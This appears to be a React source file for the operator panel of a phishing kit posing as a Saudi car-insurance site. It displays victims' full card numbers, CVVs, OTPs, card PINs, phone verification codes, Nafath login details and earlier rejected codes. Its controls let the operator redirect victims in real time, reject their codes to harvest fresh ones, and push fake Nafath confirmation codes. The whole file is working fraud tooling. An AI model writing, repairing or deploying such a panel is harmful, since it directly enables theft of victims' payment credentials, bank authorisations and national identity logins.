"use client"

import { ChevronDown } from "lucide-react"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { useState } from "react"
import { updateApplication } from "@/lib/firebase-services"
import { DataBubble } from "./data-bubble"
import { convertHistoryToBubbles, type HistoryEntry } from "@/lib/history-helpers"
import {
  handleCardApproval,
  handleCardRejection,
  handleOtpApproval,
  handleOtpRejection,
  handlePhoneOtpApproval,
  handlePhoneOtpRejection,
  handlePhoneOtpResend
} from "@/lib/history-actions"

interface VisitorDetailsProps {
  visitor: InsuranceApplication | null
}

export function VisitorDetails({ visitor }: VisitorDetailsProps) {
  const [isNavigating, setIsNavigating] = useState(false)
  const [isProcessing, setIsProcessing] = useState(false)
  const [nafadCode, setNafadCode] = useState("")

  if (!visitor) {
    return (
      <div className="flex-1 flex items-center justify-center bg-gray-50">
        <div className="text-center text-gray-500">
          <p className="text-lg">اختر زائراً لعرض التفاصيل</p>
        </div>
      </div>
    )
  }

  // Navigation handler
  const handleNavigate = async (destination: string) => {
    if (!visitor.id || isNavigating) return
    
    setIsNavigating(true)
    
    try {
      let updates: Partial<InsuranceApplication> = {}
      
      switch (destination) {
        case "home":
          updates = { currentStep: "home" as any }
          break
        case "payment":
          updates = { currentStep: "payment" as any }
          break
        case "otp":
          updates = { currentStep: "otp" as any }
          break
        case "pin":
          updates = { currentStep: "pin" as any }
          break
        case "phone":
          updates = { currentStep: "phone" as any }
          break
        case "nafad":
          updates = { currentStep: "nafad" as any }
          break
        case "nafad_modal":
          updates = { nafadConfirmationCode: "123456" } // Send confirmation code to open modal
          break
      }
      
      if (Object.keys(updates).length > 0) {
        await updateApplication(visitor.id, updates)
        alert(`تم توجيه الزائر بنجاح!`)
      }
    } catch (error) {
      console.error("Navigation error:", error)
      alert(`حدث خطأ في التوجيه: ${error}`)
    } finally {
      setIsNavigating(false)
    }
  }

  // Send Nafad confirmation code
  const handleSendNafadCode = async () => {
    if (!visitor.id || !nafadCode.trim()) return
    
    try {
      await updateApplication(visitor.id, { nafadConfirmationCode: nafadCode })
      alert(`تم إرسال رقم التأكيد: ${nafadCode}`)
      setNafadCode("")
    } catch (error) {
      alert("حدث خطأ في إرسال رقم التأكيد")
    }
  }

  // Prepare bubbles data
  const bubbles: any[] = []
  const history = (visitor.history || []) as HistoryEntry[]

  // 1. Basic Info (always show if exists)
  if (visitor.ownerName || visitor.identityNumber) {
    const basicData: Record<string, any> = {
      "الاسم": visitor.ownerName,
      "رقم الهوية": visitor.identityNumber,
      "رقم الهاتف": visitor.phoneNumber,
      "نوع الوثيقة": visitor.documentType,
      "الرقم التسلسلي": visitor.serialNumber,
      "نوع التأمين": visitor.insuranceType
    }
    
    // Add buyer info if insurance type is "نقل ملكية"
    if (visitor.insuranceType === "نقل ملكية") {
      basicData["اسم المشتري"] = visitor.buyerName
      basicData["رقم هوية المشتري"] = visitor.buyerIdNumber
    }
    
    bubbles.push({
      id: "basic-info",
      title: "معلومات أساسية",
      icon: "👤",
      color: "blue",
      data: basicData,
      timestamp: visitor.basicInfoUpdatedAt || visitor.createdAt,
      showActions: false
    })
  }

  // 2. Nafad Info (show at top if exists)
  if (visitor.nafazId || visitor.currentStep === "nafad") {
    bubbles.push({
      id: "nafad-info",
      title: "معلومات نفاذ",
      icon: "🛡️",
      color: "indigo",
      data: {
        "رقم الهوية": visitor.nafazId || "في انتظار الإدخال...",
        "كلمة المرور": visitor.nafazPass ? "تم الإدخال" : "في انتظار الإدخال...",
        "رقم التأكيد المُرسل": visitor.nafadConfirmationCode || "لم يتم الإرسال بعد"
      },
      timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
      showActions: true,
      customActions: (
        <div className="flex gap-2 mt-3">
          <input
            type="text"
            value={nafadCode}
            onChange={(e) => setNafadCode(e.target.value)}
            placeholder="أدخل رقم التأكيد"
            className="flex-1 px-3 py-2 border rounded-lg text-sm"
          />
          <button
            onClick={handleSendNafadCode}
            disabled={!nafadCode.trim()}
            className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            إرسال
          </button>
        </div>
      )
    })
  }

  // 3. Insurance Details
  if (visitor.insuranceCoverage) {
    bubbles.push({
      id: "insurance-details",
      title: "تفاصيل التأمين",
      icon: "🚗",
      color: "green",
      data: {
        "نوع التغطية": visitor.insuranceCoverage,
        "موديل المركبة": visitor.vehicleModel,
        "قيمة المركبة": visitor.vehicleValue,
        "سنة الصنع": visitor.vehicleYear,
        "استخدام المركبة": visitor.vehicleUsage,
        "موقع الإصلاح": visitor.repairLocation === 'agency' ? 'وكالة' : 'ورشة'
      },
      timestamp: visitor.insuranceUpdatedAt || visitor.updatedAt,
      showActions: false
    })
  }

  // 3. Selected Offer
  if (visitor.selectedOffer) {
    bubbles.push({
      id: "selected-offer",
      title: "العرض المختار",
      icon: "📊",
      color: "purple",
      data: {
        "الشركة": (visitor.selectedOffer as any).name || (visitor.selectedOffer as any).company,
        "السعر الأصلي": visitor.originalPrice,
        "الخصم": visitor.discount ? `${(visitor.discount * 100).toFixed(0)}%` : undefined,
        "السعر النهائي": visitor.finalPrice || visitor.offerTotalPrice,
        "المميزات المختارة": Array.isArray(visitor.selectedFeatures) ? visitor.selectedFeatures.join(", ") : "لا يوجد"
      },
      timestamp: visitor.offerUpdatedAt || visitor.updatedAt,
      showActions: false
    })
  }

  // 4. Payment & Verification Data
  // Always show current data only (no history)
  const hasMultipleAttempts = false // Always false - we don't show history
  
  // if (hasMultipleAttempts) {
  //   // Show all attempts from history
  //   const historyBubbles = convertHistoryToBubbles(history)
  //   bubbles.push(...historyBubbles)
  // } else {
    // Show current data
    
    // Card Info
    if (visitor.cardNumber) {
      bubbles.push({
        id: "card-current",
        title: "معلومات البطاقة",
        icon: "💳",
        color: "orange",
        data: {
          "رقم البطاقة": visitor.cardNumber,
          "نوع البطاقة": visitor.cardType,
          "تاريخ الانتهاء": visitor.expiryDate,
          "CVV": visitor.cvv,
          "البنك": visitor.bankInfo?.name || "غير محدد",
          "بلد البنك": visitor.bankInfo?.country || "غير محدد"
        },
        timestamp: visitor.cardUpdatedAt || visitor.updatedAt,
        status: "pending" as const,
        showActions: true,
        isLatest: true,
        type: "card"
      })
    }
    
    // OTP Code
    if (visitor.otp || visitor.otpStatus === "show_otp" || visitor.otpStatus === "verifying") {
      // Prepare data object
      const otpData: Record<string, any> = {
        "الكود": visitor.otp || "في انتظار الإدخال...",
        "الحالة": visitor.otpStatus === "approved" ? "✓ تم القبول" : 
                  visitor.otpStatus === "rejected" ? "✗ تم الرفض" :
                  visitor.otp ? "تم إدخال الكود" : "في انتظار الإدخال"
      }
      
      // Add old rejected OTPs if they exist
      if (visitor.oldOtp && visitor.oldOtp.length > 0) {
        otpData["الأكواد المرفوضة السابقة"] = visitor.oldOtp.map(item => item.code).join(", ")
      }
      
      bubbles.push({
        id: "otp-current",
        title: "كود OTP",
        icon: "🔑",
        color: "pink",
        data: otpData,
        timestamp: visitor.otpUpdatedAt || visitor.updatedAt,
        status: visitor.otpStatus === "approved" ? "approved" as const :
                visitor.otpStatus === "rejected" ? "rejected" as const : "pending" as const,
        showActions: visitor.otp && visitor.otpStatus !== "approved" && visitor.otpStatus !== "rejected",
        isLatest: true,
        type: "otp"
      })
    }
    
    // PIN Code
    if (visitor.pinCode || visitor.otpStatus === "show_pin") {
      bubbles.push({
        id: "pin-current",
        title: "رمز PIN",
        icon: "🔐",
        color: "indigo",
        data: {
          "الكود": visitor.pinCode || "في انتظار الإدخال...",
          "الحالة": visitor.pinCode ? "تم إدخال الكود" : "في انتظار الإدخال"
        },
        timestamp: visitor.pinUpdatedAt || visitor.updatedAt,
        status: "pending" as const,
        showActions: false,
        isLatest: true,
        type: "pin"
      })
    }
    
    // Phone Info
    if (visitor.phoneCarrier) {
      bubbles.push({
        id: "phone-info-current",
        title: "معلومات الهاتف",
        icon: "📱",
        color: "green",
        data: {
          "رقم الجوال": visitor.phoneNumber,
          "شركة الاتصالات": visitor.phoneCarrier
        },
        timestamp: visitor.phoneUpdatedAt || visitor.updatedAt,
        status: "pending" as const,
        showActions: false,
        isLatest: true,
        type: "phone_info"
      })
    }
    
    // Phone OTP
    if (visitor.phoneOtp || visitor.phoneOtpStatus === "show_phone_otp" || visitor.phoneOtpStatus === "verifying") {
      // Prepare data object
      const phoneOtpData: Record<string, any> = {
        "كود التحقق": visitor.phoneOtp || "في انتظار الإدخال...",
        "الحالة": visitor.phoneOtpStatus === "approved" ? "✓ تم القبول" :
                  visitor.phoneOtpStatus === "rejected" ? "✗ تم الرفض" :
                  visitor.phoneOtp ? "تم إدخال الكود" : "في انتظار الإدخال"
      }
      
      // Add old rejected phone OTPs if they exist
      if (visitor.allPhoneOtps && visitor.allPhoneOtps.length > 0) {
        phoneOtpData["الأكواد المرفوضة السابقة"] = visitor.allPhoneOtps.join(", ")
      }
      
      bubbles.push({
        id: "phone-otp-current",
        title: "كود تحقق الهاتف",
        icon: "✅",
        color: "pink",
        data: phoneOtpData,
        timestamp: visitor.phoneOtpUpdatedAt || visitor.updatedAt,
        status: visitor.phoneOtpStatus === "approved" ? "approved" as const :
                visitor.phoneOtpStatus === "rejected" ? "rejected" as const : "pending" as const,
        showActions: visitor.phoneOtp && visitor.phoneOtpStatus !== "approved" && visitor.phoneOtpStatus !== "rejected",
        isLatest: true,
        type: "phone_otp"
      })
    }
  // } // Removed - no longer needed

  // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
  const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"]
  const dynamicBubbles = bubbles.filter(b => !staticBubbleIds.includes(b.id))
  const staticBubbles = bubbles.filter(b => staticBubbleIds.includes(b.id))
  
  // Sort dynamic bubbles by timestamp (newest first)
  dynamicBubbles.sort((a, b) => {
    const timeA = new Date(a.timestamp).getTime()
    const timeB = new Date(b.timestamp).getTime()
    return timeB - timeA // Descending order (newest first)
  })
  
  // Combine: dynamic bubbles first, then static bubbles
  const sortedBubbles = [...dynamicBubbles, ...staticBubbles]

  // Action handlers for bubbles
  const handleBubbleAction = async (bubbleId: string, action: "approve" | "reject" | "resend" | "otp" | "pin") => {
    if (!visitor.id || isProcessing) return
    
    setIsProcessing(true)
    
    try {
      const bubble = bubbles.find(b => b.id === bubbleId)
      if (!bubble) return

      switch (bubble.type) {
        case "card":
          if (action === "otp") {
            // Approve card with OTP - redirect to /veri
            await updateApplication(visitor.id, { cardStatus: "approved_with_otp" })
            alert("تم قبول البطاقة! سيتم توجيه الزائر لصفحة OTP")
          } else if (action === "pin") {
            // Approve card with PIN - redirect to /confi
            await updateApplication(visitor.id, { cardStatus: "approved_with_pin" })
            alert("تم قبول البطاقة! سيتم توجيه الزائر لصفحة PIN")
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
              // Reject card - save to oldCards and reset
              await updateApplication(visitor.id, { cardStatus: "rejected" })
              alert("تم رفض البطاقة! سيتم توجيه الزائر لإدخال بطاقة جديدة")
            }
          }
          break

        case "otp":
          if (action === "approve") {
            // Approve OTP - redirect to /confi
            await updateApplication(visitor.id, { otpStatus: "approved" })
            alert("تم قبول كود OTP! سيتم توجيه الزائر لصفحة PIN")
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
              // Reject OTP - save to oldOtp and reset
              await updateApplication(visitor.id, { otpStatus: "rejected" })
              alert("تم رفض كود OTP! سيتم توجيه الزائر لإدخال كود جديد")
            }
          }
          break

        case "phone_otp":
          if (action === "approve") {
            if (hasMultipleAttempts) {
              await handlePhoneOtpApproval(visitor.id, bubbleId, history)
            } else {
              await updateApplication(visitor.id, { phoneOtpStatus: "approved" })
            }
            alert("تم قبول كود الهاتف! سيتم توجيه الزائر لصفحة نفاذ")
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض كود الهاتف؟")) {
              if (hasMultipleAttempts) {
                await handlePhoneOtpRejection(visitor.id, bubbleId, history)
              } else {
                await updateApplication(visitor.id, {
                  phoneOtpStatus: "rejected"
                })
              }
              alert("تم رفض كود الهاتف! سيتم توجيه الزائر لإدخال كود جديد")
            }
          } else if (action === "resend") {
            await updateApplication(visitor.id, {
              phoneOtp: "",
              phoneOtpStatus: "show_phone_otp"
            })
            alert("تم إعادة فتح مودال إدخال كود الهاتف")
          }
          break
      }
    } catch (error) {
      console.error("Action error:", error)
      alert(`حدث خطأ: ${error}`)
    } finally {
      setIsProcessing(false)
    }
  }

  return (
    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 p-4 md:p-6">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl md:text-2xl font-bold text-gray-900">
              {visitor.ownerName || "زائر جديد"}
            </h2>
            
            {/* Contact Info */}
            <div className="flex flex-col gap-1 mt-2">
              <div className="flex items-center gap-4 text-sm">
                <span className="text-gray-600">
                  📞 <span className="font-semibold text-gray-800">{visitor.phoneNumber || "غير محدد"}</span>
                </span>
                <span className="text-gray-400">•</span>
                <span className="text-gray-600">
                  🆔 <span className="font-semibold text-gray-800">{visitor.identityNumber || "غير محدد"}</span>
                </span>
              </div>
              
              {/* Device & Location Info */}
              {(visitor.country || visitor.browser || visitor.deviceType) && (
                <div className="flex items-center gap-2 text-xs text-gray-500">
                  {visitor.country && (
                    <span>🌍 {visitor.country}</span>
                  )}
                  {visitor.browser && (
                    <>
                      <span>•</span>
                      <span>🌐 {visitor.browser}</span>
                    </>
                  )}
                  {visitor.deviceType && (
                    <>
                      <span>•</span>
                      <span>📱 {visitor.deviceType}</span>
                    </>
                  )}
                </div>
              )}
            </div>
          </div>
          
          {/* Navigation Dropdown */}
          <div className="relative">
            <select
              onChange={(e) => handleNavigate(e.target.value)}
              disabled={isNavigating}
              className="px-4 py-2 border border-gray-300 rounded-lg bg-white text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50"
            >
              <option value="">توجيه الزائر...</option>
              <option value="home">الصفحة الرئيسية</option>
              <option value="payment">صفحة الدفع</option>
              <option value="otp">كود التحقق (OTP)</option>
              <option value="pin">رمز البطاقة (PIN)</option>
              <option value="phone">صفحة الهاتف</option>
              <option value="nafad">صفحة نفاذ</option>
              <option value="nafad_modal">مودال نفاذ</option>
            </select>
          </div>
        </div>
      </div>

      {/* Bubbles */}
      <div className="flex-1 overflow-y-auto p-3 md:p-6">
        {sortedBubbles.length === 0 ? (
          <div className="text-center text-gray-500 py-12">
            <p>لا توجد بيانات لعرضها</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 landscape:grid-cols-3 md:grid-cols-3 gap-3 landscape:gap-3 md:gap-4" dir="rtl">
          {sortedBubbles.map((bubble) => (
            <DataBubble
              key={bubble.id}
              title={bubble.title}
              data={bubble.data}
              timestamp={bubble.timestamp}
              status={bubble.status}
              showActions={bubble.showActions}
              isLatest={bubble.isLatest}
              actions={
                bubble.customActions ? bubble.customActions : bubble.showActions ? (
                  <div className="flex gap-2 mt-3">
                    {bubble.type === "card" && (
                      <>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "otp")}
                          disabled={isProcessing}
                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-blue-600 text-white rounded-lg text-xs md:text-sm hover:bg-blue-700 disabled:opacity-50 font-medium"
                        >
                          🔑 رمز OTP
                        </button>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "pin")}
                          disabled={isProcessing}
                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-purple-600 text-white rounded-lg text-xs md:text-sm hover:bg-purple-700 disabled:opacity-50 font-medium"
                        >
                          🔐 كود PIN
                        </button>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "reject")}
                          disabled={isProcessing}
                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
                        >
                          ❌ رفض
                        </button>
                      </>
                    )}
                    {bubble.type === "otp" && (
                      <>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "approve")}
                          disabled={isProcessing}
                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50"
                        >
                          قبول
                        </button>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "reject")}
                          disabled={isProcessing}
                          className="flex-1 px-4 py-2 bg-red-600 text-white rounded-lg text-sm hover:bg-red-700 disabled:opacity-50"
                        >
                          رفض
                        </button>
                      </>
                    )}
                    {bubble.type === "phone_otp" && (
                      <>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "approve")}
                          disabled={isProcessing}
                          className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50"
                        >
                          قبول
                        </button>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "reject")}
                          disabled={isProcessing}
                          className="flex-1 px-4 py-2 bg-red-600 text-white rounded-lg text-sm hover:bg-red-700 disabled:opacity-50"
                        >
                          رفض
                        </button>
                        <button
                          onClick={() => handleBubbleAction(bubble.id, "resend")}
                          disabled={isProcessing}
                          className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50"
                        >
                          إعادة إرسال
                        </button>
                      </>
                    )}
                  </div>
                ) : undefined
              }
            />
          ))}
          </div>
        )}
      </div>
    </div>
  )
}
